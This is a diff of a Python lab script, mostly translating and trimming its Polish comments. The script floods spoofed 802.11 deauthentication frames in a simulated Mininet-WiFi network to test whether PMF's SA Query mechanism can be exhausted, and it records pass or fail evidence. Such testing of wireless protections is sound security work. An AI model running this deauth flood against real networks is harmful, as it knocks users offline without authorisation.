@@ -1,27 +1,8 @@
 #!/usr/bin/env python3
 """
-PMF Bypass — SA Query Flood Attack
-
-Atak na mechanizm Security Association (SA) Query — część PMF (802.11w).
-
-Jak działa SA Query:
-  1. Klient odbiera podejrzaną ramkę Robust Management (np. Deauth)
-  2. Wysyła SA Query do AP: "czy naprawdę wysłałeś tę ramkę?"
-  3. AP odpowiada SA Query Response
-  4. Jeśli AP potwierdzi — klient akceptuje ramkę
-  5. Jeśli timeout — klient MOŻE zaakceptować ramkę bez weryfikacji
-
-Atak:
-  Wysyłamy zalew sfałszowanych ramek Deauth → klient wysyła SA Query za SA Query
-  → AP nie nadąża z odpowiedziami → timeout → klient akceptuje niezweryfikowaną
-  ramkę i rozłącza się.
-
-Cel: nie sam Deauth (PMF go blokuje), ale wyczerpanie mechanizmu SA Query
-     przez flood zapytań.
-
-Usage:
-    sudo python3 attacks/sa_query_flood.py
-    sudo python3 attacks/sa_query_flood.py --target sta1 --rate 50 --duration 30
+atak sa query flood na mechanizm pmf (802.11w)
+wysyla zalew sfalszowanych ramek deauth, zeby wyczerpac mechanizm sa query ap
+gdy ap nie nadaza z odpowiedziami, klient moze zaakceptowac niezweryfikowana ramke i sie rozlaczyc
 """
 
 import argparse
@@ -50,8 +31,8 @@ def timestamp():
 
 def build_deauth_frame(target_mac, ap_mac, reason=7):
     """
-    Buduje ramkę Deauthentication (subtype 12).
-    reason=7: Class 3 frame received from nonassociated STA
+    buduje ramke deauthentication (subtype 12)
+    reason=7: class 3 frame received from nonassociated sta
     """
     frame = RadioTap() / Dot11(
         type=0, subtype=12,         # Management / Deauthentication
@@ -68,7 +49,7 @@ def check_association(sta):
 
 
 class SAQueryMonitor:
-    """Monitoruje ramki SA Query wysyłane przez stację."""
+    """monitoruje ramki sa query wysylane przez stacje"""
 
     def __init__(self):
         self.sa_query_count = 0
@@ -85,13 +66,13 @@ class SAQueryMonitor:
 
 def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconnect=True):
     """
-    Główna funkcja ataku SA Query Flood.
+    glowna funkcja ataku sa query flood
 
-    Args:
+    args:
         target_name: nazwa stacji-celu
-        rate: liczba ramek Deauth na sekundę
+        rate: liczba ramek deauth na sekunde
         duration: czas trwania ataku w sekundach
-        verify_disconnect: czy sprawdzić rozłączenie po ataku
+        verify_disconnect: czy sprawdzic rozlaczenie po ataku
     """
     net = Mininet_wifi()
 
@@ -101,7 +82,7 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
     info(f"  Duration: {duration}s\n")
     info(f"  Total frames to send: ~{rate * duration}\n")
 
-    # ---- 1. Setup topologii ----
+    # 1. setup topologii
     ap1 = net.addAccessPoint(
         "ap1",
         ssid="PMF_Lab_Secure",
@@ -130,13 +111,13 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
     info(f"\n[{timestamp()}] Waiting for association...\n")
     time.sleep(15)
 
-    # ---- 2. Pre-flight checks ----
+    # 2. sprawdzenia przed atakiem
     if not check_association(target):
         info(f"[ERROR] {target.name} not associated. Cannot attack.\n")
         net.stop()
         return False
 
-    # Extract MAC from ip link (wintfs.mac = None in this Mininet-WiFi version)
+    # wyciagamy mac z ip link (wintfs.mac = None w tej wersji Mininet-WiFi)
     import re
     def get_mac(node):
         r = node.cmd("ip -c=never link show wlan0")
@@ -150,24 +131,24 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
     info(f"  AP:     ap1 ({ap_mac})\n")
     info(f"  Associated: YES\n")
 
-    # ---- 3. SA Query Flood ----
+    # 3. sa query flood
     info(f"\n[{timestamp()}] === Starting SA Query Flood ===\n")
 
     deauth_frame = build_deauth_frame(target_mac, ap_mac, reason=7)
-    iface = "wlan0"  # Inside Mininet namespace, interface is wlan0
+    iface = "wlan0"  # wewnatrz namespace Mininet, interfejs to wlan0
 
-    # Licznik wysłanych ramek
+    # licznik wyslanych ramek
     sent_count = 0
     start_time = time.time()
     end_time = start_time + duration
 
-    # Interwał między ramkami (sekundy)
+    # interwal miedzy ramkami (sekundy)
     interval = 1.0 / rate if rate > 0 else 0
 
-    # Monitor stanu co 5 sekund
+    # monitor stanu co 5 sekund
     last_status_time = start_time
 
-    # Build scapy command to run INSIDE namespace via target.cmd()
+    # budujemy komende scapy do uruchomienia wewnatrz namespace przez target.cmd()
     scapy_send_cmd = (
         'python3 -c "'
         'from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp;'
@@ -178,12 +159,12 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
 
     try:
         while time.time() < end_time:
-            # Run scapy INSIDE the namespace via target.cmd()
+            # uruchamiamy scapy wewnatrz namespace przez target.cmd()
             result = target.cmd(scapy_send_cmd)
             if 'OK' in result:
                 sent_count += 10
 
-            # Status update co ~5s
+            # aktualizacja statusu co ~5s
             now = time.time()
             if now - last_status_time >= 5:
                 elapsed = now - start_time
@@ -202,8 +183,8 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
     actual_duration = time.time() - start_time
     actual_rate = sent_count / actual_duration if actual_duration > 0 else 0
 
-    # ---- 4. Post-attack status ----
-    time.sleep(3)  # Dajemy czas na ewentualne rozłączenie
+    # 4. status po ataku
+    time.sleep(3)  # dajemy czas na ewentualne rozlaczenie
 
     info(f"\n[{timestamp()}] === Post-Attack Status ===\n")
 
@@ -213,7 +194,7 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
     info(f"  Actual rate:     {actual_rate:.1f} frames/s\n")
     info(f"  Target connected: {post_associated}\n")
 
-    # ---- 5. Analysis ----
+    # 5. analiza
     info(f"\n[{timestamp()}] === Analysis ===\n")
 
     if not post_associated and verify_disconnect:
@@ -223,14 +204,14 @@ def run_sa_query_flood(target_name="sta1", rate=50, duration=30, verify_disconne
         attack_result = "STATION_DISCONNECTED"
     elif post_associated:
         info(f"[PASS] Station remained connected.\n")
-        info(f"       PMF protection held — SA Query flood did not cause disconnect.\n")
+        info(f"       PMF protection held - SA Query flood did not cause disconnect.\n")
         info(f"       AP handled {sent_count} deauth attempts without issue.\n")
         attack_result = "STATION_REMAINED"
     else:
         info(f"[UNKNOWN] Station status unclear.\n")
         attack_result = "UNKNOWN"
 
-    # ---- 6. Save evidence ----
+    # 6. zapis dowodow
     os.makedirs(os.path.join(RAPORT_DIR, "logs"), exist_ok=True)
     log_path = os.path.join(
         RAPORT_DIR, "logs",
